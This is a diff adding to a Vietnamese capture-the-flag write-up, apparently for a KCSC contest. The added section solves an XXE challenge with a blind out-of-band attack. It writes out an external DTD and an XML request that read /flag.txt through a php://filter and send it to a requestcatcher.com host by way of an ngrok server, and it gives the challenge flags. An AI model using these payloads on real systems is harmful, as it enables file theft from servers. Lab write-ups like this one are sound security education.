@@ -108,7 +108,7 @@ Mình đã lên [đây](https://portswigger.net/web-security/cross-site-scriptin
 
 ![image](https://user-images.githubusercontent.com/86275419/212840507-e99e5b03-f6b3-4a0b-9c34-89ff672df9eb.png)
 
-+ `<body onload=alert(1)>`: Khi load đến tag này sẽ thi câu lệnh ở attribute `onload`, ở câu lệnh này sẽ thực thi alert(1)
++ `<body onload=alert(1)>`: Khi load đến tag này sẽ thực thi câu lệnh ở attribute `onload`, ở câu lệnh này sẽ thực thi alert(1)
 
 Mình sẽ custom lại đoạn script để nó có chức năng gửi lại cookie cho mình khi một ai đó bấm vào link bằng cách sử dụng `Fetch API`:
 
@@ -138,5 +138,75 @@ Kiểm tra lại bên `requestcatcher.com`:
  Flag: `KCSC{T3T_TU1_3_T13P_Hmmmmmmmm}`
 
  
+## XXD
+
+### Description
+Hint: `The flag location is: /flag.txt`
+Hint: `payload all the thing`
+
+![image](https://user-images.githubusercontent.com/86275419/212857366-6cf843b3-5dac-4550-b326-cd126ab4adad.png)
+
+Trang web này có một form để người dùng nhập vào và gửi đi, ta sẽ cần bắt request gửi đi của trang web để xem có thể xuất hiện lỗi gì.
+
+### Solution
+
+Ta sẽ sử dụng Burp Suite để bắt request:
+![image](https://user-images.githubusercontent.com/86275419/212859678-adb479b5-c41b-4405-9ca4-5d8a4a23e2e1.png)
+
+Ta sẽ phân tích gói tin thứ 9, đây là gói tin gửi thông tin ở form lên cho server:
+
+![image](https://user-images.githubusercontent.com/86275419/212859992-5513f2a8-38c9-4dc3-85d1-cdf299bf0a35.png)
+
+Ta thấy rằng thông tin của form được gửi lên cho server bằng XML
+Đến đây dựa vào tên đề bài (XXD) và dữ liệu gửi lên Server bằng XML ta có thể xác định trang web đang dính lỗi XXE
+
+Response:
+
+![image](https://user-images.githubusercontent.com/86275419/212863098-a8ca375c-1cea-498c-be36-3c22f5324cc0.png)
+
+
+Ta sẽ gửi một số Payload cơ bản lên Server xem Response từ server có thể lấy dữ liệu trực tiếp được không, ở đây do có Hint từ đề bài nên mình sẽ thử bằng Payload XXE của [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection):
+
+![image](https://user-images.githubusercontent.com/86275419/212866309-1be2c97d-72c4-48f6-9bc4-4b636b32af89.png)
+
+Ta nhận thấy rằng Server sẽ không trả về kết quả trực tiếp, do đó ta sẽ phải sử dụng [Blind XEE](https://portswigger.net/web-security/xxe/blind):
+
+Sau một hồi test, thì mình thấy phải sử dụng `XXE OOB with DTD and PHP filter`:
+
+![image](https://user-images.githubusercontent.com/86275419/212868589-e5f66662-d8a4-4902-9e27-6434daa00dd5.png)
+
+- Trong kỹ thuật này mình cần tạo một server có chức năng truyền file khi một request yêu cầu (mình sẽ tận dụng kali linux + ngrok) và cần một nơi để bắt được request đến (mình sẽ sử dụng [requestcatcher.com](https://duypt.requestcatcher.com/)):
++ Đầu tiên mình sẽ tạo một file XML trong server của mình đặt tên là `dtd.xml`, với nội dụng như sau:
+`<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'https://duypt.requestcatcher.com/dtd.xml?%data;'>">`
+
+--> Script này thực hiện việc gửi dữ liệu trong file `/flag.txt` tới `https://duypt.requestcatcher.com/`
+
++ Chuyển sang Burp Suite để request đến trang Web của BTC, mình sẽ request với nội dung như sau:
+`<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY % sp SYSTEM "https://6826-113-167-248-183.ap.ngrok.io/dtd.xml">
+%sp;
+%param1;
+]>
+<r>&exfil;</r>`
+
+--> Script này sẽ thực hiện việc truy vấn đến server mà ta đã dựng sẵn để lấy file `dtd.xml` chứa các entities mà ta đã định nghĩa sẵn, sau đó sẽ gọi và thực thi các entities đó
+
+![image](https://user-images.githubusercontent.com/86275419/212871511-5addcab9-b225-4a3a-968d-45a0e168911f.png)
+
+Kết quả tại `https://duypt.requestcatcher.com/`:
+
+![image](https://user-images.githubusercontent.com/86275419/212872996-e28ec2c9-6b81-4476-92a4-00611df7e626.png)
+
+Sau dấu `?` của URL chính là flag đang được encode
+Decode base 64 ta sẽ được Flag: `KCSC{blind_xxD_xxO_xx]_xxe!!@#@}`
+
+-----Continue
+
+
+
+
 
 
